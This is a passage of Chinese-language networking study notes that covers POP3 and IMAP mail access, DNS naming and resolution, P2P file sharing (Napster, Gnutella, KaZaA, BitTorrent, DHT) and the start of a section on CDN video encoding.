<p><strong>在事务处理阶段</strong>，主要做两件事</p>
<ol type="1">
<li>用户代理从邮件服务器取回报文</li>
<li>对报文做/取消删除标记</li>
</ol>
<p>用户发出 <code>quit</code>
命令之后，进入<strong>更新阶段</strong>，在这个阶段，邮件服务器通过删除标记来确认哪些报文需要被删除。</p>
<p>上面的描述中，用户读取邮件之后，会将相应的报文打上“删除标记”。这样的模式叫做<strong>下载并删除模式</strong>。除此之外，还有一种模式叫做<strong>下载并保留模式</strong>。这并不是协议特有的，可以通过用户代理进行配置。</p>
<p>下载并删除模式：</p>
<ul>
<li>优势：邮件服务器上的邮箱空间不大可能会占满；</li>
<li>劣势：在一个设备上读取邮件之后，邮件服务器上的报文就被删除，其他设备就无法再次从邮件服务器读取邮件</li>
</ul>
<p>下载并保留模式：</p>
<ul>
<li>优势：用户代理拿到的只是邮件服务器上的拷贝，而邮件服务器保留有相应报文。这样子其他设备也可以读取到该邮件</li>
<li>劣势：邮箱可能会满，需要定期处理</li>
</ul>
<p><strong>POP3在会话中是无状态的</strong>，意思就是用户认证通过之后，用户在自己的“邮箱”（服务器为用户分配的特定的目录）读取报文发送的命令中不会再携带“我是谁，我的密码是balabala”这些信息。邮件服务器也只保留部分状态信息：比如哪些用户报文被标记了删除。</p>
<h4 id="imap">4.2.2. IMAP</h4>
<p>IMAP比POP3复杂，它的出现主要是因为POP3协议要将邮件下载到本地，而IMAP可以运行用户代理远程管理邮件服务器中属于自己的“邮箱”。</p>
<p>IMAP会将第一次到达的报文放到“未读邮件”中，将读过的报文放到“已读邮件”中。也就是每个报文都会与一个目录相关联。相当于邮件服务器分配的邮箱真的就属于用户，用户可以随意的管理这个邮箱，无论是创建新的目录，移动报文到另一个目录，读取报文内容，都可以。</p>
<p>IMAP还允许用户代理获取报文中的某些部分。比如一个报文里面有一个音频，但是我只想读取文件，这是可以办到的，这在低带宽连接的时候非常有用。用户代理还可以通过指定条件来查询匹配的报文。</p>
<p>因此，IMAP是有状态的协议。它维护了IMAP会话中的用户状态信息，例如，文件夹的名字以及哪些报文属于哪些文件夹。</p>
<p>以下是两个协议最大的区别：</p>
<ul>
<li><strong>POP3：本地管理文件夹</strong></li>
<li><strong>IMAP：远程管理文件夹</strong></li>
</ul>
<h4 id="http基于web的电子邮件">4.2.3. HTTP：基于Web的电子邮件</h4>
<p>使用这种服务，用户代理就是普通的浏览器。用户与远程邮件服务器之间的通信通过HTTP进行。</p>
<p>当一个收件人想从邮箱中访问一个报文的时候，向邮件服务器发送HTTP请求报文，邮件服务器发送响应报文到浏览器，这之间使用的是HTTP协议。</p>
<p>类似的，当一个发件人想发送邮件时，可以使用HTTP协议从浏览器发送到邮件服务器。然而，发送方邮件服务器与接收方邮件服务器之间的通信还是通过SMTP。</p>
<h1 id="dns">5. DNS</h1>
<p><strong>DNS：Domain Name
System</strong>，运行在UDP协议之上。就是一来一回的信息，类似于“你叫什么”，“我叫xx”这样的对话，建立连接就要多一个RTT。因此非常适合UDP。</p>
<p>我们知道主机（路由器有IP）一般有两种标识方式</p>
<ul>
<li>主机名（域名，待会会说于域名的命名规则），比如
<code>wwww.baidu.com</code></li>
<li>IP地址，比如 <code>220.181.38.148</code></li>
</ul>
<p>但是在网络中，路由器是通过IP地址进行路由转发的，因此，我们的报文要想从源主机发送到目标主机，就必须知道目标主机的IP地址。但是我们只知道域名，不知道IP地址，那么就需要一个机制进行<strong>IP地址和域名之间的映射</strong>，这就是<strong>DNS的主要服务</strong>。</p>
<p>来看看早期的实现。早期由于主机节点非常少，几台十几台。因此，它们的主机名就是随便取得，比如mary，bob之类的。因为主机少，所以重名的概率也不高，即使真的重名了，后面加个数字即可。</p>
<p>因此，早期使用一台服务器来实现该功能，该服务器叫做DNS服务器，<strong>DNS服务器上记录着所有主机名以及对应的IP地址</strong>。工作的步骤如下，假设有一台主机名为mary，另一台为bob，mary想要知道bob的IP：</p>
<ol type="1">
<li>mary向DNS服务器发送一个包含bob的请求</li>
<li>DNS收到请求，从记录中查找bob主机名对应的IP地址:
<code>10.20.30.40</code>，找到之后并向mary发送一个包含bob主机名及其IP地址的响应</li>
<li>mary收到该响应之后，提取其中的IP地址，然后再跟bob通信</li>
</ol>
<p>但是现在主机太多了，一台DNS服务器根本hold不住，如果只有一台DNS服务器会有以下问题：</p>
<ul>
<li><strong>单点故障</strong>：如果DNS服务器坏了，那么整个互联网就GG了</li>
<li><strong>通信容量</strong>：只有一台DNS服务器，那么它的流量就会非常大，服务器可能应付不过来</li>
<li><strong>距离太远</strong>：如果DNS服务器放在美国，那么我们找
<code>www.baidu.com</code>
这个域名的IP地址，还需要越过大半个地球，时延太高了</li>
<li><strong>维护困难</strong>：现在主机这么多，每天都有新的主机上线，旧的主机下线，那么维护人员需要维护一个已亿为单位的数据库记录量，太困难了</li>
</ul>
<p>因此，分布式DNS也就出现了，也就是现在的DNS，具体后面再说。</p>
<p><strong>DNS的必要性</strong>：</p>
<ul>
<li>IP地址唯一标识主机、路由器</li>
<li>IP地址对于人类不好记忆（没有意义），人类一般倾向于有意义的字符串来标识设备</li>
<li>因此就存在着 “字符串” &lt;-&gt; IP地址 必要性</li>
<li>人类用户提供“字符串”，DNS负责将其转为IP地址</li>
</ul>
<p><strong>需要实现DNS系统，需要解决以下三个问题</strong>：</p>
<ol type="1">
<li>Q1: 如何命名设备？
<ul>
<li>需要使用有意义的字符串，好记</li>
<li>但是又不能平面命名，容易重名，需要<strong>层次化命名</strong></li>
</ul></li>
<li>Q2: 如何完成名字到IP地址的转换
<ul>
<li>分布式数据库维护和响应名字查询</li>
</ul></li>
<li>Q3: 如何维护：增加或删除一个域，需要再域名系统中做哪些工作</li>
</ol>
<p><strong>DNS总体思路</strong>：</p>
<ol type="1">
<li><p>分层的、基于域的命名机制 -&gt; 层次化命名</p></li>
<li><p>若干分布式数据库完成名字到IP的转换</p></li>
<li><p>运行在53/UDP端口</p></li>
<li><p>这是Internet核心功能，但却在网络边缘实现</p>
<blockquote>
<p>因此，Internet的复杂性就体现在很多核心功能都在网络边缘实现。</p>
</blockquote></li>
</ol>
<p><strong>DNS目的</strong>：</p>
<ol type="1">
<li><strong>主要目的</strong>：实现主机名到IP地址的转换</li>
<li>其他目的：
<ol type="1">
<li><strong>主机别名</strong>到<strong>规范名字</strong>的转换</li>
<li>邮件服务器<strong>别名</strong>到邮件服务器<strong>正规名字</strong>的转换</li>
<li>负载均衡(Load Distribution)</li>
</ol></li>
</ol>
<p>主机会有<strong>主机别名</strong>和<strong>规范名字</strong>，<strong>前者对外使用，便于用户记忆</strong>；<strong>后者对内使用，便于系统管理</strong>。举个例子：我的一个主机别名为：www.hdfzzf.icu，其他人可以通过这个名字访问我的某台服务器，但是我管理服务器的时候给这台服务器取名叫做
servers_1，因此，这就存在
<code>www.hdfzzf.icu &lt;-&gt; servers_1</code> 的转换</p>
<p>邮件服务器也是类似：别名相当于
<code>mail.someschool.edu</code>，正规名字相当于
<code>email_server</code></p>
<p><strong>负载均衡</strong>。举个例子，我维护一个网站<code>www.xxxnet.com</code>，因为数据量可能比较大，我有多台服务器来维护，每台主机都有唯一的IP地址。DNS服务器中就会有一个域名对应
IP表
的情况。用户请求我的网站的时候，DNS把第一个IP地址给他，然后将该IP地址放在
IP表 的最后，下一次请求再从 IP表
的头拿，然后把其放在最后。这样就实现了每个服务器的请求都差不多。</p>
<h2 id="如何命名设备">5.1. 如何命名设备</h2>
<p>DNS域名采取层次树状结构的命名方法。Internet首先有一个根，将其划分为几百个顶级域名(top
level domains)：</p>
<ul>
<li>通用的(generic)：<code>.com, .gov, .edu, .int, .net, .org, .firm, .mil, .hsop, .web, .arts, .rec, ...</code></li>
<li>国家的(countries)：<code>.cn, .us, .jp</code></li>
</ul>
<p>每个域下面都可以划分若干子域(subdomains)。这个树的树叶就该表着主机。</p>
<p>DNS命名空间如下图(The DNS Name Space)：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531202251.png" /></p>
<p>使用 <code>.</code> 来间隔不同级别的子域，域名因此可以分为两种：</p>
<ul>
<li><strong>一个域的域名</strong>：从树枝开始往上。比如上图中的：<code>cs.yale.edu</code></li>
<li><strong>一个主机的域名</strong>：从树叶开始往上。比如图中的：<code>robot.ai.cs.yale.edu</code></li>
</ul>
<p><strong>那么该如何管理这些域名呢</strong>？</p>
<ul>
<li>一个域管理自己的子域：比如上图中的org就要管理<code>acm,org</code>，
<code>ieee.org</code></li>
<li>创建一个新的域，需要它所属域的同意：比如在edu下面新建一个
<code>xidian.edu</code>，就需要请求edu的同意。如果名字重复了，edu就不会同意</li>
</ul>
<p><strong>需要注意：域与物理网络无关</strong></p>
<ul>
<li>域遵从组织界限，而不是物理网络
<ul>
<li>一个域的主机可以不在一个网络：西电广研院的服务器属于<code>xidian.edu.cn</code>，但是不在一个网络</li>
<li>一个网络的主机不一定在一个域：我的电脑连接校园网，和学校的服务器属于同一网络，但是我的电脑甚至没有域名</li>
</ul></li>
</ul>
<h2 id="如何完成名字到ip的转换">5.2. 如何完成名字到IP的转换</h2>
<p>接下来就需要解决如何解析名字了，也就是DNS服务器。<strong>DNS服务器可以大致分为三种</strong>：</p>
<ul>
<li>根DNS服务器</li>
<li>顶级域(TLD)DNS服务器</li>
<li>权威DNS服务器</li>
</ul>
<p>一般根DNS服务器（全球有13个）和顶级域DNS服务器都能够在网络上找到对应的IP地址。根DNS服务器中保存的所有顶级域服务器及其对应的IP地址。TLD
DNS服务器提供了权威DNS服务器的IP地址。</p>
<p>在顶级域名服务器之下的子域会被划分为区域(zone)，区域的划分由管理者自己决定，将DNS名字空间划分为<strong>互不相交</strong>的区域，每个区域内：</p>
<ul>
<li>都有一个名字服务器，维护它所管辖的区域的权威信息，这就是权威DNS服务器</li>
<li>名字服务器允许被放置在区域之外</li>
</ul>
<p>区域的划分如下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531203917.png" /></p>
<p>以edu下面的yale为例，yale和eng划分到同一区域，由同一个权威DNS服务器管理，而yale下面的cs由于主机众多，单独分了一个区域，由另一个权威DNS服务器管理。</p>
<blockquote>
<p>管理的意思是，处于cs区域的主机，绝对可以通过权威DNS服务器找到。</p>
</blockquote>
<p>DNS服务器维护资源记录(RR)，主要就是维护 <strong>域名和其他</strong>
的映射关系。RR格式：<code>(name, ttl, class, type, value)</code></p>
<ul>
<li>name：域名</li>
<li>ttl: time to
live，生存时间，决定了资源记录从缓存中删除的时间。主要作用就是区分权威、缓冲记录
<ul>
<li>没有值：权威记录，不会删除</li>
<li>有限值：缓冲记录，TTL归0则删除</li>
</ul></li>
<li>class：对于Internet，值为IN，非Internet不管</li>
<li>type：资源记录的类型</li>
<li>value：可以是IP，域名，规范名字等，取决于type</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531204853.png" /></p>
<p>其实<code>Type=NS</code>的时候比较难理解。当主机访问不同域的主机时，需要先找到域的权威服务器，从中获得对应主机的IP，此时就需要这个。</p>
<p>在这里我提个问题：<strong>为什么需要缓存记录，为什么需要删除缓存记录？</strong></p>
<p>先看一下[[#5 2 1
DNS大致工作流程]]就会知道，如果某个名字服务器缓存了某条记录，那么就不需要那么多次的查询，因此，<strong>缓存可以提高性能</strong>。比方说edu知道
<code>gaia.cs.umass.edu</code>
那么就直接回响应就好了，就需要再找权威DNS了。同样的，如果本地DNS服务器知道，连出网都可以省略。</p>
<p>那为什么又要删除呢？因为域名和IP之间的映射是会变的，假设本地知道了
<code>gaia.cs.umass.edu</code>
的IP，就不会再去请求。如果<code>gaia.cs.umass.edu</code>的IP改了，那么本地保存的就是错误的，访问不到<code>gaia.cs.umass.edu</code>。因此，删除是为了保证缓存记录与权威DNS服务器中的记录保持一致。</p>
<h3 id="dns大致工作流程">5.2.1. DNS大致工作流程</h3>
<p>DNS解析请求可以流水线工作，也可以非流水线工作。与HTTP类似[[#2 2 1
流水线和非流水线]] ### 5.2.2. 本地解析
首先，每个ISP都会有一个本地DNS服务器（Local Name
Server）。该服务器会缓存一些内部主机常访问的域名和IP的映射。除此之外一般还会缓存权威DNS服务器的IP，根服务器和TLD服务器。</p>
<p>这样，当内部主机发起一个DNS查询时，查询会被送到本地DNS服务器，如果本地DNS服务器有对应缓存，则直接返回IP；否则，由本地DNS服务器向根、TLD、权威等服务器进行查询</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531205952.png" /></p>
<p>这个本地DNS服务器也是代理作用，跟HTTP中的Web缓存作用相似。</p>
<blockquote>
<p>一台主机要想上网，必须具备四个条件： 1. IP地址 2. 子网掩码 3. Local
Name Server：解析不认识的域名 4.
网关：联网的路由器的IP地址，(通过这个路由器才能访问Internet)</p>
</blockquote>
<h3 id="网络解析">5.2.3. 网络解析</h3>
<p>如果本地无法解析，那么由本地DNS服务器向外发送DNS查询，有以下两种方式：</p>
<ol type="1">
<li>递归查询</li>
<li>迭代查询</li>
</ol>
<h4 id="递归查询">5.2.3.1. 递归查询</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531210141.png" /></p>
<p>稍微解释一下：</p>
<ol type="1">
<li>主机向本地DNS服务器请求
<code>gaia.cs.umass.edu</code>，但是它不知道</li>
<li>本地DNS服务器向根DNS服务器请求<code>gaia.cs.umass.edu</code>，根也不知道</li>
<li>根就向 <code>edu</code> TLD请求，TLD也不知大</li>
<li>TLD就向权威DNS服务器请求，它肯定知道呀</li>
<li>然后响应就顺者请求的反方向回到请求主机</li>
</ol>
<p><strong>这样做会有一个问题：根服务器负担太重了，什么乱七八糟的请求都要来我这。</strong></p>
<p><strong>解决：使用迭代查询</strong></p>
<h4 id="迭代查询踢皮球查询">5.2.3.2. 迭代查询（踢皮球查询）</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531210607.png" /></p>
<ol type="1">
<li>本地向根请求 <code>gaia.cs.umass.edu</code></li>
<li>根不知道，但是根知道edu
TLD在哪，就跟本地说“edu在这，你找它问问，这归它管”</li>
<li>本地又向 edu TLD 请求 <code>gaia.cs.umass.edu</code>，edu
TLD说“我也不知道，你去找权威DNS服务器问问，这归它管，它的地址是balabala”</li>
<li>本地再向权威DNS服务器请求
<code>gaia.cs.umass.edu</code>，权威服务器说“这我熟，它的IP是balabala，你去找它吧”</li>
<li>本地将得到的IP给请求主机</li>
</ol>
<h3 id="dns协议报文">5.2.4. DNS协议报文</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531211326.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531211334.png" /></p>
<p>这不是重点，我就说一个字段，那就是ID，为什么要有ID？如果没有ID那么主机向本地请求时需要说“我叫xxx，我要找xxx”，本地得到IP之后也要根据请求主机的名字或者IP给其回响应。但是如果使用ID，就很简单了，主机说“id=1，请求xxx”，本地只需要做好id和主机的映射关系，然后将响应会给对应主机。</p>
<p>方便的点：在本地DNS查询谁发的请求的时候，前者使用IP进行查询，后者使用ID进行查询。</p>
<h2 id="维护问题">5.3. 维护问题</h2>
<p>新增一个子域：</p>
<ul>
<li>需要向上级域的名字服务器中增加两条记录。指向这个
<strong>新增的域名</strong> 和 <strong>权威DNS服务器的地址</strong></li>
<li>在新增的子域中指定一台权威DNS服务器，负责本域的名字解析</li>
</ul>
<p>假设在 com 域下新建一个子域 <code>Utopia.com</code> ：</p>
<ul>
<li>去注册机构注册该域名，保证不重名
<ul>
<li>向机构提供权威DNS服务器的名字和IP地址</li>
<li>注册机构在 com TLD服务器中插入两条RR记录：(只显示了name, value,
type三个字段)
<ul>
<li><code>(Utopia.com, dns.Utopia.com, NS)</code></li>
<li><code>(dns.Utopia.com, 212.212.212.1, A)</code></li>
</ul></li>
</ul></li>
<li>在 <code>Utopia.com</code> 的权威服务器中确保有：
<ul>
<li>用于Web服务器的 <code>www.Utopia.com</code> 的类型为 A 的记录</li>
<li>用于邮件服务器 <code>mail.Upotia.com</code> 的类型为 MX 的记录</li>
</ul></li>
</ul>
<h2 id="安全性问题">5.4. 安全性问题</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531213509.png" /></p>
<h1 id="p2p应用">6. P2P应用</h1>
<h2 id="p2p体系的优势">6.1. P2P体系的优势</h2>
<p>本章节除了这一节之外，其余的都是C/S模式。因此，首先介绍p2p模式较于C/S模式的优势。</p>
<ul>
<li>速度快</li>
<li>自拓展性（可以“服务”非常多的主机，这是C/S模式做不到的）</li>
</ul>
<p><strong>C/S模式下</strong>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602083126.png" /></p>
<p>服务器传输：服务器需要向外传N个文件，每个文件大小F，服务器的上载速率为
<span
class="math inline">\(u_s\)</span>，因此可以计算出服务器上载N个文件的拷贝到互联网的时间为：</p>
<p><span class="math display">\[
t_1 = \frac {NF}{u_s}
\]</span></p>
<p>客户端：每个客户端需要下载一份文件拷贝，每个客户端下载速率不同，且客户端可以同时进行下载，因此，客户端的下载时间应该为下载速率最慢的客户的下载时间，即：</p>
<p><span class="math display">\[
t_2 = \frac F{d_{min}}
\]</span></p>
<p>因此，C/S模式下，一台服务器分发文件到N个peer需要的最少时间为：</p>
<p><span class="math display">\[
D_{c/s} \geq max(t_1, t_2)
\]</span></p>
<p><strong>P2P模式下</strong>：</p>
<p>同样的图，此时服务器相当于拥有一个文件全部资源的peer。</p>
<p>服务器：需要至少上载一份文件的全部拷贝：</p>
<p><span class="math display">\[
t_1 = \frac F{u_s}
\]</span></p>
<p>客户端：每个客户端必须下载一份拷贝，因此客户端的下载时间取决于下载速率最慢的客户端的下载时间：</p>
<p><span class="math display">\[
t_2 = \frac F{d_{min}}
\]</span></p>
<p>客户端：与此同时，所有客户端总体下载量是NF，也就是所有的客户端（包括服务器）需要向整个互联网中上载N份的文件拷贝，因此这个时间为：</p>
<p><span class="math display">\[
t_3 = \frac {NF}{u_s+\sum{u_i}}
\]</span></p>
<p>最后，P2P模式下，将一个F大小的文件分发到N个peer的时间为：</p>
<p><span class="math display">\[
D_{P2P} = max(t_1, t_2, t_3)
\]</span></p>
<p>在C/S模式下，客户少的时候，客户端的下载速率成为瓶颈，这是因为假设一个服务器能够服务100个人，但是就10个客户端，服务器传完10份，客户还没下载好。但是，一旦客户数量超过服务器的范围，那么服务器的上载速率就会成为瓶颈，而此时t1是N的线性函数，所以耗时就会线性增加。</p>
<p>在P2P模式下则没有这个问题，如果P2P中节点数量变多，那么总体时间也会取决于t3，而这并不是线性的，N增大的同时
<span class="math inline">\(\sum{u_i}\)</span>
也在增加。因此，两者的耗时与节点数量的图像如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602084835.png" /></p>
<p>这就是p2p速度快的原因，这也是P2P模式的自拓展性。</p>
<p>P2P大致可以分为两类：</p>
<ol type="1">
<li>非结构化</li>
<li>结构化(DHT, Distributed Hash Table)</li>
</ol>
<p>非结构化就是周围的任意两个节点都可以建立连接。一般会形成一个无向图，也叫覆盖网（overlay）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602082557.png" /></p>
<p>结构化也是任意两个节点都可以建立连接，但是会建立成一个结构，比如说环、树</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602083031.png" /></p>
<p>本节主要介绍的是非结构化的，结构化大致了解以下即可。</p>
<h2 id="非结构化">6.2. 非结构化</h2>
<p>非结构化的P2P又可以大致分为三类：</p>
<ol type="1">
<li>集中式目录：napster</li>
<li>完全分布式：Gnutella</li>
<li>混合体：KaZaA</li>
</ol>
<p>还会单独介绍一个协议 <strong>BitTorrent</strong>, <strong>BT</strong>
协议。我们常说的BT种子就是跟这相关的。这个不好分类，硬要分的话，可以算是混合体中的一个。</p>
<h3 id="集中式目录napster">6.2.1. 集中式目录(napster)</h3>
<p>napster协议就是采用集中式目录，这是一个专门用于音乐分享的</p>
<p>napster工作原理如下：（每个客户端都配置了中心服务器的地址）</p>
<ol type="1">
<li>每个客户端上线的时候都会告诉中心服务器两件事：
<ul>
<li>自己的IP地址</li>
<li>自己拥有哪些内容</li>
</ul></li>
<li>Alice想要查询某个资源的时候，会给中心服务器发送请求，中心服务器查询自己的记录，告诉Alice哪些peer有这些资源、这些peer的IP</li>
<li>Alice向这些peer（比如Bob）请求资源，Bob给Alice回响应</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602085715.png" /></p>
<p>这种模式下，中心服务器知道有哪些peer已经上线，并且知道这些peer拥有哪些可以分享的资源，但是中心服务器没有资源，资源分布在各个peer中。</p>
<p>这种模式的特点：<strong>文件传输是分散的，内容定位是集中的</strong>。但也有一些问题：</p>
<ol type="1">
<li><strong>单点故障</strong>：中心服务器一旦宕机，整个网络崩溃</li>
<li><strong>性能瓶颈</strong>：需要依赖一定的用户量才可以保证速度，如果只有一两个用户，那么速度就是两个用户的上载和下载速度的最小值决定的</li>
<li><strong>侵犯版权</strong>：P2P中的其他peer不好找到，数量多且分布广，但是中心服务器好找，因此很容易被追踪</li>
</ol>
<h3 id="完全分布式gnutella">6.2.2. 完全分布式(Gnutella)</h3>
<p>Gnutella协议是全分布式的，没有中心服务器，整个网络中的所有节点都是peer。</p>
<p>从三个部分来分析 Gnutella：</p>
<ul>
<li>请求资源</li>
<li>加入网络</li>
<li>退出网络</li>
</ul>
<h4 id="请求资源">6.2.2.1. 请求资源</h4>
<p>假设此时，有多个peer已经建立起一个覆盖网络（peer与peer间的连接是逻辑的），此时Alice想要请求资源该如何做呢？</p>
<ol type="1">
<li><p>Alice会向她的邻居发出请求“我想要A文件，谁知道它在哪？”</p>
<blockquote>
<p>邻居：在覆盖网络中，与Alice直接建立连接的peer</p>
</blockquote></li>
<li><p>邻居收到请求之后会做两件事：</p>
<ul>
<li>查询：如果自己有该资源，那么则会向Alice回“我有”</li>
<li>转发：将Alice的资源继续转发给自己的邻居</li>
</ul></li>
<li><p>非Alice邻居的peer收到转发的请求时也会做和上面一样的两件事：</p>
<ul>
<li>查询：如果自己有，则向<strong>转发消息</strong>的<strong>发送方</strong>回“我有”（转发消息的发送方不是Alice，可以理解为一种递归的方式）</li>
<li>转发：继续转发</li>
</ul></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602091023.png" /></p>
<p>这种查询方式叫做：<strong>查询洪泛</strong>。这种方式也有一个问题，那就是Alice的请求会发送给某个邻居A，A又给Alice转发（因为Alice也是A的邻居，然后Alice又给A转发，没完没了），其他节点也是同样的，A给B转发，B也会给A转发。这就会导致过了好久后，这个请求还在网络中。解决办法有两种：</p>
<ol type="1">
<li><strong>有限泛洪</strong>：设置转发的次数，请求转发一定次数之后就不再转发</li>
<li><strong>记住状态</strong>：当A转发了Alice的消息之后就会记住自己已经转发过了，当再次收到这条转发消息之后就不会再次转发</li>
</ol>
<h4 id="加入网络">6.2.2.2. 加入网络</h4>
<p>请求资源解决了，但是如何搭建这样一个网络呢？刚开始的时候大家都不知道对方，如何进行连接呢？</p>
<p>其实原理是这样的，客户端里面会配置有几个固定的节点，这些节点已经构建成了一个网络。当客户上线的时候，需要选择其中一个节点发送‘ping’，节点收到‘ping’之后会给客户回一个‘pong’，并且向邻居继续发送‘ping’，邻居收到‘ping’之后会给客户回‘pong’，这样子继续下去，客户就会收到许多‘pong’，客户从中选择一定数量的节点进行连接。此时网络搭建完毕</p>
<h4 id="退出网络">6.2.2.3. 退出网络</h4>
<p>退出时，客户需要向网络中的邻居告知，邻居收到之后就会断开与其的连接。除此之外，还会补充一个peer进来，维持使整个网络能够正常运行的条件。</p>
<h3 id="混合体kazaa">6.2.3. 混合体(KaZaA)</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602092511.png" /></p>
<ul>
<li>每个peer要么是组长，要么隶属于一个组长</li>
<li>组长会跟踪组内所有peer的资源内容</li>
<li>组长与组长之间：
<ul>
<li>peer会先向组长查询，组长没有的话，则由组长向其他组长查询</li>
<li>获得其他组长的文件copy</li>
</ul></li>
</ul>
<p>KaZaA查询：</p>
<ol type="1">
<li>每个文件都有一个hash值用来唯一标识该文件</li>
<li>peer向组长发送查询</li>
<li>组长进行匹配
<ol type="1">
<li>如果组内有：则向请求方发送拥有该资源的peer的IP</li>
<li>如果组内没有：则组长向其他组长转发请求，收到其他组长的响应之后，将响应转发给请求peer</li>
</ol></li>
<li>请求peer向拥有文件的peer发送一个带hash值的<strong>HTTP请求</strong></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602093511.png" /></p>
<h3 id="bittorrent">6.2.4. BitTorrent</h3>
<p>这个是日常生活中最常见的，先介绍几个概念：</p>
<ul>
<li>洪流(torrent)：参与一个特定文件的所有peer的集合</li>
<li>块：一个文件会被划分为多个256Kb的数据块</li>
<li>map：每个peer维护一个bit map，如果 <span
class="math inline">\(dth\)</span> 位为1，表示拥有这个文件的 <span
class="math inline">\(dth\)</span> 块，0则表示没有</li>
<li>种子：拥有一个文件的全部块的peer</li>
</ul>
<h4 id="加入torrent">6.2.4.1. 加入torrent</h4>
<p>每个torrent拥有一个tracker（追踪器）。当一个peer加入torrent时，需要向tracker注册自己，并且周期性的通知tracker自己还在torrent中。这样子，tracker可以追踪torrent中的所有peer。</p>
<p>peer（假设为Alice）加入torrent时，此时Alice没有该文件的任意块，tracker从torrent中随机的找出一些peer（假设30个），并将这30个peer的IP地址交给Alice。然后Alice向这些peer请求TCP连接。</p>
<p>加入torrent之后，Alice会周期的询问临近的peer的bit
map。也就是说，Alice在任何时刻，都知道临近的peer拥有哪些块。此时，就会有两个问题：</p>
<ul>
<li>Alice要请求哪些资源块</li>
<li>Alice要向哪些peer请求资源</li>
</ul>
<h4 id="请求资源-1">6.2.4.2. 请求资源</h4>
<p>这里介绍一个请求资源块的技术：<strong>最稀缺优先(rarest
first)</strong>。原理：根据邻近peer的bit
map以及自己没有的块，去请求<strong>自己没有的并且peer中也最少的</strong>资源块。这样做的目的是为了<strong>均衡每个块在洪流中的副本数量</strong>。举个极端的例子，某一个块只有一个peer有，如果该peer下线了，那么torrent中的所有peer将都得不到完整的文件。</p>
<h4 id="响应请求">6.2.4.3. 响应请求</h4>
<p>通过时间的累积，Alice也有了部分资源块。此时，其他peer向Alice请求块，Alice需要如何响应呢？假设有10个请求，那么Alice会：</p>
<ol type="1">
<li>第一个周期(10s)：评估上一个周期内这些请求peer向Alice提供数据时的比特率，并根据比特率选择速度最快的4个进行响应。这4个peer成为<strong>疏通(unchocked)</strong></li>
<li>第二个周期(10s)：与第一个周期一样</li>
<li>第三个周期(10s)：除了选择前4个之外，还会随机的选择请求peer中的一个，响应它的请求，假设是Bob</li>
</ol>
<p>这么做的好处有很多：</p>
<ol type="1">
<li><strong>对于其他peer</strong>：假设Bob第一次请求Alice，之前也没有响应过Alice，那么Bob可能无法成为Alice的疏通。但是该机制下，Bob就可能随机的被Alice选择，从而获得资源快</li>
<li><strong>对于Alice</strong>：假设Bob拥有Alice没有的资源块，Alice从没有向Bob提供过数据。该机制下，Alice随机选择到Bob，并响应它的请求，那么Bob就会在下一个周期评估Alice的比特率，这样子Alice可能会在下一个周期成为Bob的疏通，从而两者可以交换数据。</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602102932.png" /></p>
<p>这种关于交换的激励机制一般称为“一报还一报(tit-for-tat)”，除了上面的优势之外，还可以避免一种情况，那就是某个peer只请求，不响应，当个“吸血鬼”。如果peer不响应，那么一段时间后，该peer就不会成为其他peer的疏通，虽然可以通过随机选择被选中，但是这样一来，获得资源的速度就慢了。</p>
<blockquote>
<p>一报还一报：你对我好，我对你好；你对我不好，我也对你不好。</p>
</blockquote>
<h2 id="dht">6.3. DHT</h2>
<p>就大致讲一下，假设已经搭建了一个环形的网络。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602103319.png" /></p>
<p>这些服务器构成了一个环形网络，并且在该网络中都有特定的id。每个文件也拥有特定的hash值。假设，hash值为2-50的都放在50节点，1201-1300的放在1节点，21-100的放在100节点......。如果我要请求hash为78的节点，就可以通过环形网络一个一个网下查，直到100节点。然后100节点向请求方提供特定文件。</p>
<h1 id="cdn">7. CDN</h1>
<p>CDN：Content Distribution Network，内容分发网。</p>
<p>如今的网络上，视频流量占大头，这就会出现两个挑战：</p>
<ol type="1">
<li>挑战1：<strong>规模性</strong>。如何服务全世界这么多用户</li>
<li>挑战2：<strong>异构性</strong>。不同用户、不同地区、不同设备的能力不同，该如何根据情况调整服务策略</li>
</ol>
<h2 id="异构性">7.1. 异构性</h2>
<h3 id="视频的编码">7.1.1. 视频的编码</h3>
<p><strong>视频</strong>：以固定速度显示图片序列。比如游戏中的30帧、60帧、120帧，就是1s分别显示30、60、120张图像。原理就是利用人的眼睛的滞后性，人看到一张图片之后，会停留一段时间，此时计算机切换到另一张图片，眼睛感觉不到。</p>
<p>视频通常比较大，因为有太多的图片了，但是前后两张图片之间并不是完全不同的，而是基本都相同（找一本空白的本子在每一页画一个图像，然后翻动本子就能显示出一个“视频”。但是每页其实都差不多。画过的应该能体会到）。这个就叫做图像之间的<strong>时间冗余</strong>。</p>
<p>同一张图片中，也不是每一个像素点都不一样，有一大部分像素点应该是一样的，这就是图像的<strong>空间冗余</strong>。</p>
<p>因此，视频的冗余有两种：</p>
<ol type="1">
<li>时间冗余</li>
<li>空间冗余</li>
